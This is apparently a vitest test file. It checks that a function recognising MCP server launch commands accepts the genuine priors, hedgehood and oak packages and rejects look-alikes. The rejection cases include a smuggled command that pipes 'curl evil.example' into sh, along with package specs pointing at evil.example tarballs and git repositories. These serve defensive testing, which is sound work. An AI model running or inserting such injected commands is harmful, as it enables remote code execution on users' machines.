import { describe, expect, it } from "vitest";
import { knownServerId } from "@nomad/adapters";

/** Profiles recognise only the real package (with a version, range or tag), never a look-alike. */

const tool = (command: string, args: string[]) => ({ name: "x", kind: "mcp", mcp: { transport: "stdio", command, args, env: {}, headers: {} } }) as never;

describe("known server matching", () => {
  it("recognises every real form, as before", () => {
    for (const [args, id] of [
      [["-y", "@priors/mcp"], "priors"],
      [["-y", "@priors/mcp@0.20.0"], "priors"],
      [["-y", "@priors/mcp@latest"], "priors"],
      [["-y", "@priors/mcp@^0.20"], "priors"],
      [["-y", "@hedgehood-io/mcp"], "hedgehood"],
      [["-y", "@hedgehood-io/mcp@0.5.1"], "hedgehood"],
      [["-y", "@oakagentkit/addon@0.3.9", "mcp"], "oak"],
      [["-y", "@oakagentkit/addon", "mcp"], "oak"]
    ] as const) expect(knownServerId(tool("npx", [...args])), args.join(" ")).toBe(id);
    // Priors' documented key-file wrapper.
    expect(knownServerId(tool("sh", ["-c", 'read -r PRIORS_KEY < "$1" && export PRIORS_KEY && exec npx -y @priors/mcp@0.20.0', "priors-mcp", "~/.config/priors/agent.key"]))).toBe("priors");
    expect(knownServerId(tool("priors-mcp", []))).toBe("priors");
    expect(knownServerId(tool("oak", ["mcp"]))).toBe("oak");
    expect(knownServerId(tool("hedgehood-mcp", ["--mainnet"]))).toBe("hedgehood");
  });

  it("does not take a look-alike for the real package", () => {
    for (const args of [
      ["-y", "@priors/mcp-evil"],
      ["-y", "evil@priors/mcp"],
      ["-y", "@priors/mcp@https://evil.example/x.tgz"],
      ["-y", "@priors/mcp@0.20.0;curl evil.example|sh"],
      ["-y", "@hedgehood-io/mcp-proxy"],
      ["-y", "@hedgehood-io/mcp@git+https://evil.example/x.git"],
      ["-y", "@oakagentkit/addon-evil", "mcp"],
      ["-y", "@oakagentkit/addon@file:../evil", "mcp"]
    ]) expect(knownServerId(tool("npx", args)), args.join(" ")).toBeNull();
    expect(knownServerId(tool("node", ["-e", "console.log('@priors/mcp')"]))).toBeNull();
    expect(knownServerId(tool("sh", ["-c", "exec npx -y @priors/mcp-evil"]))).toBeNull();
  });
});
